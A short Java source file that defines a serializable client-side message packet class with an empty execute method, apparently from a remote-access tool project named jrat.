package net.jrat.core.packet.client;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class C1PacketMessage implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String message;
	
	public C1PacketMessage(String message)
	{
		this.message = message;
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}